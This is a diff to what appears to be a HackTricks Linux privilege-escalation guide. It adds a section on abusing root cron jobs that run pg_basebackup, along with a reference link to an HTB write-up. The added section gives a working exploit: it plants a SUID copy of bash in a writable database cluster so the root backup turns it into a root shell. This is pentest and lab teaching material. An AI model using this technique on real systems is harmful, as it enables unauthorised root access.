@@ -540,6 +540,29 @@ for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; do
 
 **You can also use** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (this will monitor and list every process that starts).
 
+### Root backups that preserve attacker-set mode bits (pg_basebackup)
+
+If a root-owned cron wraps `pg_basebackup` (or any recursive copy) against a database directory you can write to, you can plant a **SUID/SGID binary** that will be recopied as **root:root** with the same mode bits into the backup output.
+
+Typical discovery flow (as a low-priv DB user):
+- Use `pspy` to spot a root cron calling something like `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` every minute.
+- Confirm the source cluster (e.g., `/var/lib/postgresql/14/main`) is writable by you and the destination (`/opt/backups/current`) becomes owned by root after the job.
+
+Exploit:
+
+```bash
+# As the DB service user owning the cluster directory
+cd /var/lib/postgresql/14/main
+cp /bin/bash .
+chmod 6777 bash
+
+# Wait for the next root backup run (pg_basebackup preserves permissions)
+ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
+/opt/backups/current/bash -p    # root shell without dropping privileges
+```
+
+This works because `pg_basebackup` preserves file mode bits when copying the cluster; when invoked by root the destination files inherit **root ownership + attacker-chosen SUID/SGID**. Any similar privileged backup/copy routine that keeps permissions and writes into an executable location is vulnerable.
+
 ### Invisible cron jobs
 
 It's possible to create a cronjob **putting a carriage return after a comment** (without newline character), and the cron job will work. Example (note the carriage return char):
@@ -1890,6 +1913,7 @@ vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
 - [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
 - [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
 - [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
+- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
 - [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
 
 {{#include ../../banners/hacktricks-training.md}}
